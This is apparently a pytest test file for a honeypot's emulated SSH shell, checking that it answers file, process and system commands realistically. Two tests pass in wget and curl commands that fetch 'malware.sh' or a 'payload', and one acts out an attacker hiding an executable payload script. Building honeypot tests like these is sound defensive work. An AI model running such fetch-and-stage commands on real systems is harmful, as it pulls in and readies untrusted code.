"""Tests for SSH Command Processor."""

import pytest
from plugins.honeypot.engine.ssh_commands import CommandProcessor
from plugins.honeypot.engine.virtual_filesystem import VirtualFilesystem


@pytest.fixture
def processor():
    """Create command processor with fresh filesystem."""
    vfs = VirtualFilesystem(username="testuser", hostname="test-server")
    fingerprint = {
        "hostname": "test-server",
        "kernel": "Linux test-server 5.4.0-42-generic #46-Ubuntu SMP x86_64 GNU/Linux",
    }
    return CommandProcessor(vfs, fingerprint)


def test_basic_commands(processor):
    """Test basic shell commands."""
    assert processor.process_command("pwd") == "/home/testuser"
    assert processor.process_command("whoami") == "testuser"
    assert "testuser" in processor.process_command("id")
    assert processor.process_command("hostname") == "test-server"


def test_touch_and_ls(processor):
    """Test touch and ls commands."""
    output = processor.process_command("touch test.txt")
    assert output == ""

    output = processor.process_command("ls")
    assert "test.txt" in output


def test_mkdir_and_cd(processor):
    """Test directory operations."""
    processor.process_command("mkdir mydir")
    processor.process_command("cd mydir")

    assert processor.process_command("pwd") == "/home/testuser/mydir"


def test_echo_and_cat(processor):
    """Test echo and cat."""
    output = processor.process_command("echo hello world")
    assert output == "hello world"

    # Write to file via redirection
    processor.process_command("echo test content > test.txt")
    output = processor.process_command("cat test.txt")
    assert "test content" in output


def test_redirection(processor):
    """Test output redirection."""
    processor.process_command("echo line1 > file.txt")
    processor.process_command("echo line2 >> file.txt")

    output = processor.process_command("cat file.txt")
    assert "line1" in output
    assert "line2" in output


def test_pipes(processor):
    """Test command piping."""
    # Create multi-line file
    processor.process_command("echo line1 > test.txt")
    processor.process_command("echo line2 >> test.txt")
    processor.process_command("echo line3 >> test.txt")

    # Test pipe with grep
    output = processor.process_command("cat test.txt | grep line2")
    assert "line2" in output


def test_rm(processor):
    """Test file removal."""
    processor.process_command("touch deleteme.txt")
    assert "deleteme.txt" in processor.process_command("ls")

    processor.process_command("rm deleteme.txt")
    assert "deleteme.txt" not in processor.process_command("ls")


def test_command_not_found(processor):
    """Test unknown commands."""
    output = processor.process_command("fakecommand")
    assert "command not found" in output.lower()


def test_cat_nonexistent(processor):
    """Test cat on non-existent file."""
    output = processor.process_command("cat nonexistent.txt")
    assert "No such file" in output


def test_chmod(processor):
    """Test chmod (simulated)."""
    processor.process_command("touch file.txt")
    output = processor.process_command("chmod 755 file.txt")
    assert output == ""  # Silent success


def test_head_tail(processor):
    """Test head and tail commands."""
    # Create file with multiple lines
    processor.process_command(
        "echo -e 'line1\\nline2\\nline3\\nline4\\nline5' > test.txt"
    )

    # Test head
    output = processor.process_command("head -n 2 test.txt")
    lines = output.split("\n")
    assert len([line for line in lines if line]) <= 2

    # Test tail
    output = processor.process_command("tail -n 2 test.txt")
    lines = output.split("\n")
    assert len([line for line in lines if line]) <= 2


def test_grep(processor):
    """Test grep command."""
    processor.process_command("echo apple > fruits.txt")
    processor.process_command("echo banana >> fruits.txt")
    processor.process_command("echo cherry >> fruits.txt")

    output = processor.process_command("grep banana fruits.txt")
    assert "banana" in output


def test_wc(processor):
    """Test word count command."""
    processor.process_command("echo hello world > test.txt")

    output = processor.process_command("wc test.txt")
    assert "test.txt" in output
    # Should show lines, words, chars


def test_find(processor):
    """Test find command."""
    processor.process_command("mkdir subdir")
    processor.process_command("cd subdir")
    processor.process_command("touch file.txt")
    processor.process_command("cd ..")

    output = processor.process_command("find . -name file.txt")
    assert "file.txt" in output


def test_uname(processor):
    """Test uname command."""
    output = processor.process_command("uname")
    assert output == "Linux"

    output = processor.process_command("uname -a")
    assert "Linux" in output
    assert "test-server" in output


def test_date(processor):
    """Test date command."""
    output = processor.process_command("date")
    assert len(output) > 0
    # Should contain date/time info


def test_ps(processor):
    """Test ps command."""
    output = processor.process_command("ps aux")
    assert "PID" in output or "COMMAND" in output


def test_wget_blocked(processor):
    """Test that wget fails with realistic DNS error."""
    output = processor.process_command("wget http://example.com/malware.sh")
    # Realistic error: DNS resolution failure (not honeypot fingerprint)
    assert "unable to resolve" in output.lower() or "failed" in output.lower()


def test_curl_blocked(processor):
    """Test that curl fails with realistic DNS error."""
    output = processor.process_command("curl http://example.com/payload")
    # Realistic error: DNS resolution failure (not honeypot fingerprint)
    assert "could not resolve" in output.lower() or "failed" in output.lower()


def test_bash_c(processor):
    """Test bash -c command execution."""
    output = processor.process_command("bash -c 'echo nested'")
    assert "nested" in output


def test_complex_scenario(processor):
    """Test complex multi-command scenario."""
    # Simulate attacker workflow
    processor.process_command("mkdir .hidden")
    processor.process_command("cd .hidden")
    processor.process_command("echo 'malicious content' > payload.sh")
    processor.process_command("chmod +x payload.sh")

    # Verify
    output = processor.process_command("pwd")
    assert ".hidden" in output

    output = processor.process_command("ls")
    assert "payload.sh" in output

    output = processor.process_command("cat payload.sh")
    assert "malicious content" in output


def test_multiple_files(processor):
    """Test operations on multiple files."""
    processor.process_command("touch file1.txt file2.txt file3.txt")

    output = processor.process_command("ls")
    assert "file1.txt" in output
    assert "file2.txt" in output
    assert "file3.txt" in output

    processor.process_command("rm file1.txt file2.txt")
    output = processor.process_command("ls")
    assert "file1.txt" not in output
    assert "file3.txt" in output
